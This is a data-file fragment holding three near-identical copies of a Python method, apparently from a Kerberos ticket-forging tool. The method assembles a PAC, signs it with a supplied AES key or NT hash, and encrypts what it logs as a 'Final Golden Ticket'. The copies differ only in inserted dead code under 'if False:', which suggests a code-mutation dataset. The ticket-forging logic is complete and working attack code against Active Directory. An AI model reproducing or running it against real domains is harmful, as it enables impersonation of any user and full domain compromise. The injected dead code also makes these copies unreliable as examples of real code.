            "def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):\n    if False:\n        i = 10\n    logging.info('Signing/Encrypting final ticket')\n    pac_count = 4\n    validationInfoBlob = pacInfos[PAC_LOGON_INFO]\n    validationInfoAlignment = b'\\x00' * self.getPadLength(len(validationInfoBlob))\n    pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]\n    pacClientInfoAlignment = b'\\x00' * self.getPadLength(len(pacClientInfoBlob))\n    pacUpnDnsInfoBlob = None\n    pacUpnDnsInfoAlignment = None\n    if PAC_UPN_DNS_INFO in pacInfos:\n        pac_count += 1\n        pacUpnDnsInfoBlob = pacInfos[PAC_UPN_DNS_INFO]\n        pacUpnDnsInfoAlignment = b'\\x00' * self.getPadLength(len(pacUpnDnsInfoBlob))\n    pacAttributesInfoBlob = None\n    pacAttributesInfoAlignment = None\n    if PAC_ATTRIBUTES_INFO in pacInfos:\n        pac_count += 1\n        pacAttributesInfoBlob = pacInfos[PAC_ATTRIBUTES_INFO]\n        pacAttributesInfoAlignment = b'\\x00' * self.getPadLength(len(pacAttributesInfoBlob))\n    pacRequestorInfoBlob = None\n    pacRequestorInfoAlignment = None\n    if PAC_REQUESTOR_INFO in pacInfos:\n        pac_count += 1\n        pacRequestorInfoBlob = pacInfos[PAC_REQUESTOR_INFO]\n        pacRequestorInfoAlignment = b'\\x00' * self.getPadLength(len(pacRequestorInfoBlob))\n    serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n    serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]\n    serverChecksumAlignment = b'\\x00' * self.getPadLength(len(serverChecksumBlob))\n    privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n    privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]\n    privSvrChecksumAlignment = b'\\x00' * self.getPadLength(len(privSvrChecksumBlob))\n    offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count\n    validationInfoIB = PAC_INFO_BUFFER()\n    validationInfoIB['ulType'] = PAC_LOGON_INFO\n    validationInfoIB['cbBufferSize'] = len(validationInfoBlob)\n    validationInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + validationInfoIB['cbBufferSize'])\n    pacClientInfoIB = PAC_INFO_BUFFER()\n    pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE\n    pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)\n    pacClientInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])\n    pacUpnDnsInfoIB = None\n    if pacUpnDnsInfoBlob is not None:\n        pacUpnDnsInfoIB = PAC_INFO_BUFFER()\n        pacUpnDnsInfoIB['ulType'] = PAC_UPN_DNS_INFO\n        pacUpnDnsInfoIB['cbBufferSize'] = len(pacUpnDnsInfoBlob)\n        pacUpnDnsInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacUpnDnsInfoIB['cbBufferSize'])\n    pacAttributesInfoIB = None\n    if pacAttributesInfoBlob is not None:\n        pacAttributesInfoIB = PAC_INFO_BUFFER()\n        pacAttributesInfoIB['ulType'] = PAC_ATTRIBUTES_INFO\n        pacAttributesInfoIB['cbBufferSize'] = len(pacAttributesInfoBlob)\n        pacAttributesInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacAttributesInfoIB['cbBufferSize'])\n    pacRequestorInfoIB = None\n    if pacRequestorInfoBlob is not None:\n        pacRequestorInfoIB = PAC_INFO_BUFFER()\n        pacRequestorInfoIB['ulType'] = PAC_REQUESTOR_INFO\n        pacRequestorInfoIB['cbBufferSize'] = len(pacRequestorInfoBlob)\n        pacRequestorInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacRequestorInfoIB['cbBufferSize'])\n    serverChecksumIB = PAC_INFO_BUFFER()\n    serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM\n    serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)\n    serverChecksumIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])\n    privSvrChecksumIB = PAC_INFO_BUFFER()\n    privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM\n    privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)\n    privSvrChecksumIB['Offset'] = offsetData\n    buffers = validationInfoIB.getData() + pacClientInfoIB.getData()\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoIB.getData()\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoIB.getData()\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoIB.getData()\n    buffers += serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoBlob + pacUpnDnsInfoAlignment\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoBlob + pacAttributesInfoAlignment\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoBlob + pacRequestorInfoAlignment\n    buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType = PACTYPE()\n    pacType['cBuffers'] = pac_count\n    pacType['Version'] = 0\n    pacType['Buffers'] = buffers + buffersTail\n    blobToChecksum = pacType.getData()\n    checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]\n    if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyServer = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyServer = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyServer = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])\n    checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]\n    if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyPriv = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyPriv = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyPriv = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'])\n    serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)\n    logging.info('\\tPAC_SERVER_CHECKSUM')\n    privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])\n    logging.info('\\tPAC_PRIVSVR_CHECKSUM')\n    buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType['Buffers'] = buffers + buffersTail\n    authorizationData = AuthorizationData()\n    authorizationData[0] = noValue\n    authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value\n    authorizationData[0]['ad-data'] = pacType.getData()\n    authorizationData = encoder.encode(authorizationData)\n    encTicketPart['authorization-data'][0]['ad-data'] = authorizationData\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Customized EncTicketPart')\n        print(encTicketPart.prettyPrint())\n        print('\\n')\n    encodedEncTicketPart = encoder.encode(encTicketPart)\n    cipher = _enctype_table[kdcRep['ticket']['enc-part']['etype']]\n    if cipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.rc4_hmac.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Unsupported enctype 0x%x' % cipher.enctype)\n    logging.info('\\tEncTicketPart')\n    cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)\n    kdcRep['ticket']['enc-part']['cipher'] = cipherText\n    kdcRep['ticket']['enc-part']['kvno'] = 2\n    encodedEncASRepPart = encoder.encode(encASorTGSRepPart)\n    if self.__domain == self.__server:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncASRepPart')\n        cipherText = cipher.encrypt(sessionKey, 3, encodedEncASRepPart, None)\n    else:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncTGSRepPart')\n        cipherText = cipher.encrypt(sessionKey, 8, encodedEncASRepPart, None)\n    kdcRep['enc-part']['cipher'] = cipherText\n    kdcRep['enc-part']['etype'] = cipher.enctype\n    kdcRep['enc-part']['kvno'] = 1\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final Golden Ticket')\n        print(kdcRep.prettyPrint())\n        print('\\n')\n    return (encoder.encode(kdcRep), cipher, sessionKey)",
            "def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    logging.info('Signing/Encrypting final ticket')\n    pac_count = 4\n    validationInfoBlob = pacInfos[PAC_LOGON_INFO]\n    validationInfoAlignment = b'\\x00' * self.getPadLength(len(validationInfoBlob))\n    pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]\n    pacClientInfoAlignment = b'\\x00' * self.getPadLength(len(pacClientInfoBlob))\n    pacUpnDnsInfoBlob = None\n    pacUpnDnsInfoAlignment = None\n    if PAC_UPN_DNS_INFO in pacInfos:\n        pac_count += 1\n        pacUpnDnsInfoBlob = pacInfos[PAC_UPN_DNS_INFO]\n        pacUpnDnsInfoAlignment = b'\\x00' * self.getPadLength(len(pacUpnDnsInfoBlob))\n    pacAttributesInfoBlob = None\n    pacAttributesInfoAlignment = None\n    if PAC_ATTRIBUTES_INFO in pacInfos:\n        pac_count += 1\n        pacAttributesInfoBlob = pacInfos[PAC_ATTRIBUTES_INFO]\n        pacAttributesInfoAlignment = b'\\x00' * self.getPadLength(len(pacAttributesInfoBlob))\n    pacRequestorInfoBlob = None\n    pacRequestorInfoAlignment = None\n    if PAC_REQUESTOR_INFO in pacInfos:\n        pac_count += 1\n        pacRequestorInfoBlob = pacInfos[PAC_REQUESTOR_INFO]\n        pacRequestorInfoAlignment = b'\\x00' * self.getPadLength(len(pacRequestorInfoBlob))\n    serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n    serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]\n    serverChecksumAlignment = b'\\x00' * self.getPadLength(len(serverChecksumBlob))\n    privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n    privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]\n    privSvrChecksumAlignment = b'\\x00' * self.getPadLength(len(privSvrChecksumBlob))\n    offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count\n    validationInfoIB = PAC_INFO_BUFFER()\n    validationInfoIB['ulType'] = PAC_LOGON_INFO\n    validationInfoIB['cbBufferSize'] = len(validationInfoBlob)\n    validationInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + validationInfoIB['cbBufferSize'])\n    pacClientInfoIB = PAC_INFO_BUFFER()\n    pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE\n    pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)\n    pacClientInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])\n    pacUpnDnsInfoIB = None\n    if pacUpnDnsInfoBlob is not None:\n        pacUpnDnsInfoIB = PAC_INFO_BUFFER()\n        pacUpnDnsInfoIB['ulType'] = PAC_UPN_DNS_INFO\n        pacUpnDnsInfoIB['cbBufferSize'] = len(pacUpnDnsInfoBlob)\n        pacUpnDnsInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacUpnDnsInfoIB['cbBufferSize'])\n    pacAttributesInfoIB = None\n    if pacAttributesInfoBlob is not None:\n        pacAttributesInfoIB = PAC_INFO_BUFFER()\n        pacAttributesInfoIB['ulType'] = PAC_ATTRIBUTES_INFO\n        pacAttributesInfoIB['cbBufferSize'] = len(pacAttributesInfoBlob)\n        pacAttributesInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacAttributesInfoIB['cbBufferSize'])\n    pacRequestorInfoIB = None\n    if pacRequestorInfoBlob is not None:\n        pacRequestorInfoIB = PAC_INFO_BUFFER()\n        pacRequestorInfoIB['ulType'] = PAC_REQUESTOR_INFO\n        pacRequestorInfoIB['cbBufferSize'] = len(pacRequestorInfoBlob)\n        pacRequestorInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacRequestorInfoIB['cbBufferSize'])\n    serverChecksumIB = PAC_INFO_BUFFER()\n    serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM\n    serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)\n    serverChecksumIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])\n    privSvrChecksumIB = PAC_INFO_BUFFER()\n    privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM\n    privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)\n    privSvrChecksumIB['Offset'] = offsetData\n    buffers = validationInfoIB.getData() + pacClientInfoIB.getData()\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoIB.getData()\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoIB.getData()\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoIB.getData()\n    buffers += serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoBlob + pacUpnDnsInfoAlignment\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoBlob + pacAttributesInfoAlignment\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoBlob + pacRequestorInfoAlignment\n    buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType = PACTYPE()\n    pacType['cBuffers'] = pac_count\n    pacType['Version'] = 0\n    pacType['Buffers'] = buffers + buffersTail\n    blobToChecksum = pacType.getData()\n    checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]\n    if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyServer = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyServer = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyServer = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])\n    checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]\n    if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyPriv = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyPriv = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyPriv = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'])\n    serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)\n    logging.info('\\tPAC_SERVER_CHECKSUM')\n    privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])\n    logging.info('\\tPAC_PRIVSVR_CHECKSUM')\n    buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType['Buffers'] = buffers + buffersTail\n    authorizationData = AuthorizationData()\n    authorizationData[0] = noValue\n    authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value\n    authorizationData[0]['ad-data'] = pacType.getData()\n    authorizationData = encoder.encode(authorizationData)\n    encTicketPart['authorization-data'][0]['ad-data'] = authorizationData\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Customized EncTicketPart')\n        print(encTicketPart.prettyPrint())\n        print('\\n')\n    encodedEncTicketPart = encoder.encode(encTicketPart)\n    cipher = _enctype_table[kdcRep['ticket']['enc-part']['etype']]\n    if cipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.rc4_hmac.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Unsupported enctype 0x%x' % cipher.enctype)\n    logging.info('\\tEncTicketPart')\n    cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)\n    kdcRep['ticket']['enc-part']['cipher'] = cipherText\n    kdcRep['ticket']['enc-part']['kvno'] = 2\n    encodedEncASRepPart = encoder.encode(encASorTGSRepPart)\n    if self.__domain == self.__server:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncASRepPart')\n        cipherText = cipher.encrypt(sessionKey, 3, encodedEncASRepPart, None)\n    else:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncTGSRepPart')\n        cipherText = cipher.encrypt(sessionKey, 8, encodedEncASRepPart, None)\n    kdcRep['enc-part']['cipher'] = cipherText\n    kdcRep['enc-part']['etype'] = cipher.enctype\n    kdcRep['enc-part']['kvno'] = 1\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final Golden Ticket')\n        print(kdcRep.prettyPrint())\n        print('\\n')\n    return (encoder.encode(kdcRep), cipher, sessionKey)",
            "def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    logging.info('Signing/Encrypting final ticket')\n    pac_count = 4\n    validationInfoBlob = pacInfos[PAC_LOGON_INFO]\n    validationInfoAlignment = b'\\x00' * self.getPadLength(len(validationInfoBlob))\n    pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]\n    pacClientInfoAlignment = b'\\x00' * self.getPadLength(len(pacClientInfoBlob))\n    pacUpnDnsInfoBlob = None\n    pacUpnDnsInfoAlignment = None\n    if PAC_UPN_DNS_INFO in pacInfos:\n        pac_count += 1\n        pacUpnDnsInfoBlob = pacInfos[PAC_UPN_DNS_INFO]\n        pacUpnDnsInfoAlignment = b'\\x00' * self.getPadLength(len(pacUpnDnsInfoBlob))\n    pacAttributesInfoBlob = None\n    pacAttributesInfoAlignment = None\n    if PAC_ATTRIBUTES_INFO in pacInfos:\n        pac_count += 1\n        pacAttributesInfoBlob = pacInfos[PAC_ATTRIBUTES_INFO]\n        pacAttributesInfoAlignment = b'\\x00' * self.getPadLength(len(pacAttributesInfoBlob))\n    pacRequestorInfoBlob = None\n    pacRequestorInfoAlignment = None\n    if PAC_REQUESTOR_INFO in pacInfos:\n        pac_count += 1\n        pacRequestorInfoBlob = pacInfos[PAC_REQUESTOR_INFO]\n        pacRequestorInfoAlignment = b'\\x00' * self.getPadLength(len(pacRequestorInfoBlob))\n    serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n    serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]\n    serverChecksumAlignment = b'\\x00' * self.getPadLength(len(serverChecksumBlob))\n    privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n    privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]\n    privSvrChecksumAlignment = b'\\x00' * self.getPadLength(len(privSvrChecksumBlob))\n    offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count\n    validationInfoIB = PAC_INFO_BUFFER()\n    validationInfoIB['ulType'] = PAC_LOGON_INFO\n    validationInfoIB['cbBufferSize'] = len(validationInfoBlob)\n    validationInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + validationInfoIB['cbBufferSize'])\n    pacClientInfoIB = PAC_INFO_BUFFER()\n    pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE\n    pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)\n    pacClientInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])\n    pacUpnDnsInfoIB = None\n    if pacUpnDnsInfoBlob is not None:\n        pacUpnDnsInfoIB = PAC_INFO_BUFFER()\n        pacUpnDnsInfoIB['ulType'] = PAC_UPN_DNS_INFO\n        pacUpnDnsInfoIB['cbBufferSize'] = len(pacUpnDnsInfoBlob)\n        pacUpnDnsInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacUpnDnsInfoIB['cbBufferSize'])\n    pacAttributesInfoIB = None\n    if pacAttributesInfoBlob is not None:\n        pacAttributesInfoIB = PAC_INFO_BUFFER()\n        pacAttributesInfoIB['ulType'] = PAC_ATTRIBUTES_INFO\n        pacAttributesInfoIB['cbBufferSize'] = len(pacAttributesInfoBlob)\n        pacAttributesInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacAttributesInfoIB['cbBufferSize'])\n    pacRequestorInfoIB = None\n    if pacRequestorInfoBlob is not None:\n        pacRequestorInfoIB = PAC_INFO_BUFFER()\n        pacRequestorInfoIB['ulType'] = PAC_REQUESTOR_INFO\n        pacRequestorInfoIB['cbBufferSize'] = len(pacRequestorInfoBlob)\n        pacRequestorInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacRequestorInfoIB['cbBufferSize'])\n    serverChecksumIB = PAC_INFO_BUFFER()\n    serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM\n    serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)\n    serverChecksumIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])\n    privSvrChecksumIB = PAC_INFO_BUFFER()\n    privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM\n    privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)\n    privSvrChecksumIB['Offset'] = offsetData\n    buffers = validationInfoIB.getData() + pacClientInfoIB.getData()\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoIB.getData()\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoIB.getData()\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoIB.getData()\n    buffers += serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoBlob + pacUpnDnsInfoAlignment\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoBlob + pacAttributesInfoAlignment\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoBlob + pacRequestorInfoAlignment\n    buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType = PACTYPE()\n    pacType['cBuffers'] = pac_count\n    pacType['Version'] = 0\n    pacType['Buffers'] = buffers + buffersTail\n    blobToChecksum = pacType.getData()\n    checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]\n    if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyServer = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyServer = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyServer = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])\n    checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]\n    if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyPriv = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyPriv = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyPriv = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'])\n    serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)\n    logging.info('\\tPAC_SERVER_CHECKSUM')\n    privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])\n    logging.info('\\tPAC_PRIVSVR_CHECKSUM')\n    buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType['Buffers'] = buffers + buffersTail\n    authorizationData = AuthorizationData()\n    authorizationData[0] = noValue\n    authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value\n    authorizationData[0]['ad-data'] = pacType.getData()\n    authorizationData = encoder.encode(authorizationData)\n    encTicketPart['authorization-data'][0]['ad-data'] = authorizationData\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Customized EncTicketPart')\n        print(encTicketPart.prettyPrint())\n        print('\\n')\n    encodedEncTicketPart = encoder.encode(encTicketPart)\n    cipher = _enctype_table[kdcRep['ticket']['enc-part']['etype']]\n    if cipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.rc4_hmac.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Unsupported enctype 0x%x' % cipher.enctype)\n    logging.info('\\tEncTicketPart')\n    cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)\n    kdcRep['ticket']['enc-part']['cipher'] = cipherText\n    kdcRep['ticket']['enc-part']['kvno'] = 2\n    encodedEncASRepPart = encoder.encode(encASorTGSRepPart)\n    if self.__domain == self.__server:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncASRepPart')\n        cipherText = cipher.encrypt(sessionKey, 3, encodedEncASRepPart, None)\n    else:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncTGSRepPart')\n        cipherText = cipher.encrypt(sessionKey, 8, encodedEncASRepPart, None)\n    kdcRep['enc-part']['cipher'] = cipherText\n    kdcRep['enc-part']['etype'] = cipher.enctype\n    kdcRep['enc-part']['kvno'] = 1\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final Golden Ticket')\n        print(kdcRep.prettyPrint())\n        print('\\n')\n    return (encoder.encode(kdcRep), cipher, sessionKey)",
